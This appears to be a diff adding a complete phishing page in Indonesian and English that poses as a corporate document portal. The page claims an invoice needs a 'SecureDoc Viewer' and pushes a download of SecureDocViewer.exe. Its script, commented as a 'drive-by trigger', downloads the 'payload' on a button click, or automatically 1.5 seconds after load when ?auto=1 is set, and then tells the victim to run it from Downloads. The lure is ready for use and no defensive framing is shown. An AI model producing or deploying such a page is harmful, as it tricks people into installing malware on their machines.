@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Corporate Document Portal</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: 'Segoe UI', Tahoma, sans-serif;
+    background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+    min-height: 100vh; display: flex; align-items: center; justify-content: center;
+  }
+  .card {
+    background: #fff; border-radius: 12px; padding: 40px 44px;
+    max-width: 520px; width: 92%; box-shadow: 0 18px 50px rgba(0,0,0,.35);
+  }
+  .brand { display: flex; align-items: center; gap: 10px; margin-bottom: 24px; }
+  .brand .dot {
+    width: 34px; height: 34px; border-radius: 8px; background: #2a5298;
+    color: #fff; display: flex; align-items: center; justify-content: center;
+    font-weight: 700; font-size: 15px;
+  }
+  .brand span { font-weight: 600; color: #233; letter-spacing: .3px; }
+  h1 { font-size: 21px; color: #16223a; margin-bottom: 6px; word-break: break-all; }
+  .sub { color: #5a6a85; font-size: 13.5px; margin-bottom: 22px; }
+  .docbox {
+    border: 1px solid #dbe3ef; background: #f6f9ff; border-radius: 10px;
+    padding: 16px 18px; margin-bottom: 22px; font-size: 14px; color: #33415e;
+  }
+  .docbox b { color: #16223a; }
+  .req { font-size: 13.5px; color: #44546f; margin-bottom: 10px; line-height: 1.55; }
+  .req b { color: #16223a; }
+  #dl {
+    width: 100%; padding: 13px 16px; border: 0; border-radius: 9px;
+    background: #2a5298; color: #fff; font-size: 15px; font-weight: 600;
+    cursor: pointer; transition: background .15s;
+  }
+  #dl:hover { background: #1e3c72; }
+  #status { margin-top: 16px; font-size: 13px; color: #3d5a80; line-height: 1.55; display: none; }
+  .foot { margin-top: 26px; font-size: 11.5px; color: #93a1b8; text-align: center; }
+</style>
+</head>
+<body>
+  <div class="card">
+    <div class="brand"><div class="dot">CP</div><span>Corporate Document Portal</span></div>
+
+    <h1>invoice_Q3-2026.pdf</h1>
+    <div class="sub">Diteruskan dari: Finance Department &mdash; internal use only</div>
+
+    <div class="docbox">
+      Dokumen ini ditandatangani secara digital dan hanya dapat dibuka
+      melalui <b>SecureDoc Viewer</b>. Viewer versi <b>2.4 (wajib)</b> belum
+      terpasang di perangkat Anda.
+    </div>
+
+    <div class="req">
+      Untuk melanjutkan, instal <b>SecureDoc Viewer 2.4</b> dengan menekan
+      tombol di bawah, lalu jalankan installer dari folder <b>Downloads</b>.
+      Dokumen akan terbuka otomatis setelah viewer aktif.
+    </div>
+
+    <button id="dl">&#11015;&#65039; Open Document &mdash; Install SecureDoc Viewer</button>
+
+    <p id="status">
+      Menyiapkan dokumen&hellip; Jika viewer tidak terbuka otomatis, buka
+      <b>SecureDocViewer.exe</b> dari folder <b>Downloads</b>, lalu dokumen
+      Anda akan tampil di viewer.
+    </p>
+
+    <div class="foot">IT Helpdesk: ext. 4100 &middot; Reference: INV-88213</div>
+  </div>
+
+<script>
+// ============================================================
+// Drive-by trigger:
+//  - Mode one-click (default) : tombol memicu download payload
+//  - Mode auto    (?auto=1)   : download terpicu otomatis 1.5s setelah load
+// Payload di-serve dari path yang sama dengan halaman ini.
+// ============================================================
+var PAYLOAD = "SecureDocViewer.exe";
+
+function trigger() {
+  var a = document.createElement("a");
+  a.href = PAYLOAD;
+  a.download = PAYLOAD;
+  document.body.appendChild(a);
+  a.click();
+  a.remove();
+  var s = document.getElementById("status");
+  s.style.display = "block";
+}
+
+document.getElementById("dl").addEventListener("click", trigger);
+
+if (new URLSearchParams(location.search).get("auto") === "1") {
+  setTimeout(trigger, 1500);
+}
+</script>
+</body>
+</html>
